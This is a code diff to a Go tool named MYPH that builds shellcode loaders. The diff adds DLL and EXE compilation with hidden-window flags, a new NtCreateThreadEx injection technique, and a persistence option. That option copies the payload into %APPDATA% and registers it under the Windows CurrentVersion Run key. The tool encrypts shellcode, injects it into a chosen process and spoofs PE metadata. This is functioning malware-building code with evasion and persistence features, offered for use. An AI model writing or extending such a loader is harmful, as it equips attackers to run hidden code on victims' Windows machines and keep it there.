@@ -14,7 +14,7 @@ import (
 )
 
 const MYPH_TMP_DIR = "/tmp/myph-out"
-const MYPH_TMP_WITH_PAYLOAD = "/tmp/myph-out/payload.exe"
+const MYPH_TMP_WITH_PAYLOAD = "/tmp/myph-out/payload."
 
 const ASCII_ART = `
               ...                                        -==[ M Y P H ]==-
@@ -42,9 +42,28 @@ const ASCII_ART = `
 
     `
 
+func BuildLoader(opts *Options) *exec.Cmd {
+	os.Setenv("GOOS", opts.OS)
+	os.Setenv("GOARCH", opts.Arch)
+	if opts.BuildType == "dll" {
+		os.Setenv("CGO_ENABLED", "1")
+		os.Setenv("CC", "x86_64-w64-mingw32-gcc")
+		fmt.Println("[*] Compiling payload as dll...")
+
+		return exec.Command("go", "build", "-buildmode=c-shared", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.dll", ".")
+	} else if opts.BuildType == "exe" {
+		fmt.Println("[*] Compiling payload as executable...")
+
+		return exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.exe", ".")
+	} else {
+		fmt.Printf("[!] Buildtype format not supported!")
+		return nil
+	}
+}
+
 func GetParser(opts *Options) *cobra.Command {
 
-	version := "1.2.1"
+	version := "1.2.2"
 	var spoofMetadata = &cobra.Command{
 		Use:                "spoof",
 		Version:            version,
@@ -114,7 +133,7 @@ func GetParser(opts *Options) *cobra.Command {
 			fmt.Printf("%s\n\n", ASCII_ART)
 
 			/* later, we will call "go build" on a golang project, so we need to set up the project tree */
-			err := tools.CreateTmpProjectRoot(MYPH_TMP_DIR)
+			err := tools.CreateTmpProjectRoot(MYPH_TMP_DIR, opts.Persistence)
 			if err != nil {
 				fmt.Printf("[!] Error generating project root: %s\n", err)
 				os.Exit(1)
@@ -203,6 +222,21 @@ func GetParser(opts *Options) *cobra.Command {
 				panic(err)
 			}
 
+			persistData := ""
+			if opts.Persistence != "" {
+				persistData = fmt.Sprintf(`persistExecute("%s")`, opts.Persistence)
+				execCmd := exec.Command("go", "get", "golang.org/x/sys/windows/registry")
+				execCmd.Dir = MYPH_TMP_DIR
+				_, _ = execCmd.Output()
+
+				template = tools.GetPersistTemplate()
+				err = tools.WriteToFile(MYPH_TMP_DIR, "persist.go", template)
+				if err != nil {
+					panic(err)
+				}
+				fmt.Printf("\nUsing persistence technique, file will be installed to %%APPDATA%%\\%s\n", opts.Persistence)
+			}
+
 			/* write main execution template */
 			encodedShellcode := tools.EncodeForInterpolation(encType, encrypted)
 			encodedKey := tools.EncodeForInterpolation(encType, []byte(opts.Key))
@@ -214,14 +248,13 @@ func GetParser(opts *Options) *cobra.Command {
 					encodedKey,
 					encodedShellcode,
 					opts.SleepTime,
+					persistData,
+					opts.BuildType == "dll",
 				),
 			)
 			if err != nil {
 				panic(err)
 			}
-
-			os.Setenv("GOOS", opts.OS)
-			os.Setenv("GOARCH", opts.Arch)
 
 			templateFunc := loaders.SelectTemplate(opts.Technique)
 			if templateFunc == nil {
@@ -237,6 +270,10 @@ func GetParser(opts *Options) *cobra.Command {
 			fmt.Printf("\n[+] Template (%s) written to tmp directory. Compiling...\n", opts.Technique)
 
 			execCmd := exec.Command("go", "get", "github.com/Binject/debug/pe")
+			execCmd.Dir = MYPH_TMP_DIR
+			_, _ = execCmd.Output()
+
+			execCmd = BuildLoader(opts)
 			execCmd.Dir = MYPH_TMP_DIR
 			_, _ = execCmd.Output()
 
@@ -269,7 +306,11 @@ func GetParser(opts *Options) *cobra.Command {
 				os.Exit(1)
 			}
 
-			tools.MoveFile(MYPH_TMP_WITH_PAYLOAD, opts.OutName)
+			format := "exe"
+			if opts.BuildType == "dll" {
+				format = "dll"
+			}
+			tools.MoveFile(MYPH_TMP_WITH_PAYLOAD+format, opts.OutName+"."+format)
 			os.RemoveAll(MYPH_TMP_DIR)
 
 			fmt.Printf("[+] Done! Compiled payload: %s\n", opts.OutName)
@@ -284,14 +325,16 @@ func GetParser(opts *Options) *cobra.Command {
 	rootCmd.Flags().StringVarP(&opts.OutName, "out", "f", defaults.OutName, "output name")
 	rootCmd.Flags().StringVarP(&opts.ShellcodePath, "shellcode", "s", defaults.ShellcodePath, "shellcode path")
 	rootCmd.Flags().StringVarP(&opts.Target, "process", "p", defaults.Target, "target process to inject shellcode to")
-	rootCmd.Flags().StringVarP(&opts.Technique, "technique", "t", defaults.Technique, "shellcode-loading technique (allowed: CRT, CRTx, CreateFiber, ProcessHollowing, CreateThread, Syscall, SyscallTest, Etwp)")
+	rootCmd.Flags().StringVarP(&opts.Technique, "technique", "t", defaults.Technique, "shellcode-loading technique (allowed: CRT, CRTx, CreateFiber, ProcessHollowing, CreateThread, NtCreateThreadEx, Syscall, SyscallTest, Etwp)")
 	rootCmd.Flags().VarP(&opts.Encryption, "encryption", "e", "encryption method. (allowed: AES, chacha20, XOR, blowfish)")
 	rootCmd.Flags().StringVarP(&opts.Key, "key", "k", "", "encryption key, auto-generated if empty. (if used by --encryption)")
 	rootCmd.Flags().UintVarP(&opts.SleepTime, "sleep-time", "", defaults.SleepTime, "sleep time in seconds before executing loader (default: 0)")
 	rootCmd.Flags().BoolVarP(&opts.WithDebug, "debug", "d", false, "builds binary with debug symbols")
+	rootCmd.PersistentFlags().StringVarP(&opts.Persistence, "persistence", "z", defaults.Persistence, "name of the binary being placed in '%APPDATA%' and in 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' reg key (default: \"\")")
 
 	spoofMetadata.Flags().StringVarP(&opts.PEFilePath, "pe", "p", defaults.PEFilePath, "PE file to spoof")
 	spoofMetadata.Flags().StringVarP(&opts.VersionFilePath, "file", "f", defaults.VersionFilePath, "manifest file path (as JSON)")
 
 	return rootCmd
+
 }
